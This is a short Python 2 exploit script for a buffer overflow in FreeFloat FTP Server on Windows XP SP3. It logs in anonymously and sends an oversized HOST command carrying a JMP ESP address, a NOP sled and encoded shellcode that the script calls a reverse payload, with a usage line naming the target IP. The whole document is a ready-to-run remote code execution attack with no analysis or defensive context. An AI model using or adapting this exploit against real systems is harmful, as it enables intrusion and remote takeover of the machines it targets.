#!/bin/python
import sys,socket

#windows xp service pack 3
#FreeFloat FTP Server - buffer overflow
#usage ./exploit.py <ip_address>

buffer="A"*247
buffer+="\x77\xb2\xfa\x77"  #JMP ESP

buffer+="\x90"*20  #NOP sled

#Reverse payload need to moddify accordingly)

buffer+=("\xdb\xc8\xbe\xc5\x1f\x0e\xa4\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x72\x17\x03\x72\x17\x83\x2f\xe3\xec\x51\x53\xf4\x73"
"\x99\xab\x05\x14\x13\x4e\x34\x14\x47\x1b\x67\xa4\x03\x49\x84"
"\x4f\x41\x79\x1f\x3d\x4e\x8e\xa8\x88\xa8\xa1\x29\xa0\x89\xa0"
"\xa9\xbb\xdd\x02\x93\x73\x10\x43\xd4\x6e\xd9\x11\x8d\xe5\x4c"
"\x85\xba\xb0\x4c\x2e\xf0\x55\xd5\xd3\x41\x57\xf4\x42\xd9\x0e"
"\xd6\x65\x0e\x3b\x5f\x7d\x53\x06\x29\xf6\xa7\xfc\xa8\xde\xf9"
"\xfd\x07\x1f\x36\x0c\x59\x58\xf1\xef\x2c\x90\x01\x8d\x36\x67"
"\x7b\x49\xb2\x73\xdb\x1a\x64\x5f\xdd\xcf\xf3\x14\xd1\xa4\x70"
"\x72\xf6\x3b\x54\x09\x02\xb7\x5b\xdd\x82\x83\x7f\xf9\xcf\x50"
"\xe1\x58\xaa\x37\x1e\xba\x15\xe7\xba\xb1\xb8\xfc\xb6\x98\xd4"
"\x31\xfb\x22\x25\x5e\x8c\x51\x17\xc1\x26\xfd\x1b\x8a\xe0\xfa"
"\x5c\xa1\x55\x94\xa2\x4a\xa6\xbd\x60\x1e\xf6\xd5\x41\x1f\x9d"
"\x25\x6d\xca\x32\x75\xc1\xa5\xf2\x25\xa1\x15\x9b\x2f\x2e\x49"
"\xbb\x50\xe4\xe2\x56\xab\x6f\xcd\x0f\xb2\x08\xa5\x4d\xb4\xc7"
"\x69\xdb\x52\x8d\x81\x8d\xcd\x3a\x3b\x94\x85\xdb\xc4\x02\xe0"
"\xdc\x4f\xa1\x15\x92\xa7\xcc\x05\x43\x48\x9b\x77\xc2\x57\x31"
"\x1f\x88\xca\xde\xdf\xc7\xf6\x48\x88\x80\xc9\x80\x5c\x3d\x73"
"\x3b\x42\xbc\xe5\x04\xc6\x1b\xd6\x8b\xc7\xee\x62\xa8\xd7\x36"
"\x6a\xf4\x83\xe6\x3d\xa2\x7d\x41\x94\x04\xd7\x1b\x4b\xcf\xbf"
"\xda\xa7\xd0\xb9\xe2\xed\xa6\x25\x52\x58\xff\x5a\x5b\x0c\xf7"
"\x23\x81\xac\xf8\xfe\x01\xdc\xb2\xa2\x20\x75\x1b\x37\x71\x18"
"\x9c\xe2\xb6\x25\x1f\x06\x47\xd2\x3f\x63\x42\x9e\x87\x98\x3e"
"\x8f\x6d\x9e\xed\xb0\xa7")

buffer+="\x90"*(1000-len(buffer))
print "[+]sending buffer"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((sys.argv[1],21))
s.recv(1024)
s.send('USER anonymous \r\n')
s.recv(1024)
s.send('PASS anonymous \r\n')
s.recv(1024)
s.send('HOST'+buffer+'\r\n')
s.close()
print "[+] Exploit Completed"
